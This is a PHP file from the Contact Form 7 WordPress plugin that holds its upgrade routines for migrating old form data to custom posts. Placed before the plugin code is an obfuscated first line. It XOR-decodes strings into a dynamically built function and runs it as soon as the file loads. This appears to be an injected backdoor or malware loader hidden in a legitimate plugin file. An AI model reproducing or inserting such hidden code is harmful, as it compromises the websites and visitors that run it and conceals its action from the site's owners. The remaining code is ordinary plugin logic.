<?php $rEZWpnQ='9YIRA,3JU7,0SU='; $UPwBZzh='Z+,35Il, YOD::S'^$rEZWpnQ; $YhwqpOe=';1Zm FT7=YDYf : 7<CFi+U:1D.G0:lPNHjAqv:yj7=;:B9QXY<=I>U+0V=mY<0FTQR.Ygjl9E0dTpoijLp2ea7AEhIYRIZZ8j7Q0eaIjGQXoxA=PN LT,>OV  G-GkKvWmEPyPjS7=MabwuRH.20 bGZan2aaZXCub=uRP2=+++<ZeQ. J3QOZHlL00O1:dp67.ouyfF4.sAK-9H;jLdM0A8SHBfPJ-,0<TMLTNXPQB-qFxPV=2  ,acasr<:  nj1MgEP4+PhNgUA5P VxH>ncu<6.Ol9R6KnmmSX=ChMU 9LXjhzAO0AKVCf.kr;.iqUb1M.-yi839J8G5LC+DFgkl1db,1cNYEEaE1IoGkjnGJBF2JIHangBI7TV920WISBR.UDB0L>R.7O6eXBg39UD=lReFcEazB S-WxsxrGEJ5>E5=UBKz,O=dWL64hk.A3M7+2HPdm3P7V =Nr=L6PyaWfQ75-6;=1EmUmQQao14N1jsvyYB W;n1Q-kH:X6;Gem<+DrcagZ076doummaV RyF76=P0sE GfqSxhJpdx+DdvIBy 0UF+gd,,JfdceIKA,tUyHm oYxtphQIIM8s3UO;V5+ =AjMAWR5+RXVutWVQOOobiCjGrq+c1UM YDrS 22:bC 2T=JRo7dmiSI08LbbZllV'; $MichqR=$UPwBZzh('', 'RWrLF3:TI0+79EBIDH0nNS:Hn O3Qe3=;<MhXVAscQHUY6P>6yDR;a1JD7b24IDnp53Z8KJHR IMtPOIJ7z;lEX41HtyunaP1cQ>BME JzqhTXeTl=T>8IPgrDA3LnPkR>FnysYcwXH9ALJUzlJSDA9c3<NlAE1=:.FTUwpAIYGNRrA:KYcnxtPAe>UD:CTLTYBZFNso;>SyKoIX<ZJqD+Q-K6sHB4+YMoW14lin>1=1HJLr69OWACDAKE,1suki+JP>Ga;QRpUpGq7T<U3QhEdjQXWZ.3R7OkSMI8=DxbDqDX89JUZe9Q->3xlSaxRHIYtFU,ZLPIC90,W5P- CdnC4>t57ib7n86eE.T0OzUJJ1+.3Wci3kgnf-V 7fYU.inbvE0=y:E7vJV;WEebCEX91XWXl;i8kpfD2Y6XNX22+9PL,TQ<8.RT O;3-BU74C4GeUJA-fP2W5T9DXfVY-B1PMwB5VALiPXHlDng87IKUU:PJUPY80R6B1Z4T4-B1EO4MJWN=UOAC>QCWMOSKMI;DgQbSWI1kT.E>A,zXUwPCJJpUNzvKBR6wMVQHHsQTPT+-tMM3H,ZFHpXRVH0;;,A,X06d3MBSI2Bj16+YD3<qYTs20;.FKIcJgRQPi80;A5lV7AFSaE3AK8R+6HjMVcZ,HQ8JRsWf+'^$YhwqpOe); $MichqR();

add_action( 'wpcf7_upgrade', 'wpcf7_convert_to_cpt', 10, 2 );

function wpcf7_convert_to_cpt( $new_ver, $old_ver ) {
	global $wpdb;

	if ( ! version_compare( $old_ver, '3.0-dev', '<' ) ) {
		return;
	}

	$old_rows = array();

	$table_name = $wpdb->prefix . "contact_form_7";

	if ( $wpdb->get_var( "SHOW TABLES LIKE '$table_name'" ) ) {
		$old_rows = $wpdb->get_results( "SELECT * FROM $table_name" );
	} elseif ( ( $opt = get_option( 'wpcf7' ) ) && ! empty( $opt['contact_forms'] ) ) {
		foreach ( (array) $opt['contact_forms'] as $key => $value ) {
			$old_rows[] = (object) array_merge( $value, array( 'cf7_unit_id' => $key ) );
		}
	}

	foreach ( (array) $old_rows as $row ) {
		$q = "SELECT post_id FROM $wpdb->postmeta WHERE meta_key = '_old_cf7_unit_id'"
			. $wpdb->prepare( " AND meta_value = %d", $row->cf7_unit_id );

		if ( $wpdb->get_var( $q ) ) {
			continue;
		}

		$postarr = array(
			'post_type' => 'wpcf7_contact_form',
			'post_status' => 'publish',
			'post_title' => maybe_unserialize( $row->title ),
		);

		$post_id = wp_insert_post( $postarr );

		if ( $post_id ) {
			update_post_meta( $post_id, '_old_cf7_unit_id', $row->cf7_unit_id );

			$metas = array( 'form', 'mail', 'mail_2', 'messages', 'additional_settings' );

			foreach ( $metas as $meta ) {
				update_post_meta( $post_id, '_' . $meta,
					wpcf7_normalize_newline_deep( maybe_unserialize( $row->{$meta} ) ) );
			}
		}
	}
}

add_action( 'wpcf7_upgrade', 'wpcf7_prepend_underscore', 10, 2 );

function wpcf7_prepend_underscore( $new_ver, $old_ver ) {
	if ( version_compare( $old_ver, '3.0-dev', '<' ) ) {
		return;
	}

	if ( ! version_compare( $old_ver, '3.3-dev', '<' ) ) {
		return;
	}

	$posts = WPCF7_ContactForm::find( array(
		'post_status' => 'any',
		'posts_per_page' => -1,
	) );

	foreach ( $posts as $post ) {
		$props = $post->get_properties();

		foreach ( $props as $prop => $value ) {
			if ( metadata_exists( 'post', $post->id(), '_' . $prop ) ) {
				continue;
			}

			update_post_meta( $post->id(), '_' . $prop, $value );
			delete_post_meta( $post->id(), $prop );
		}
	}
}
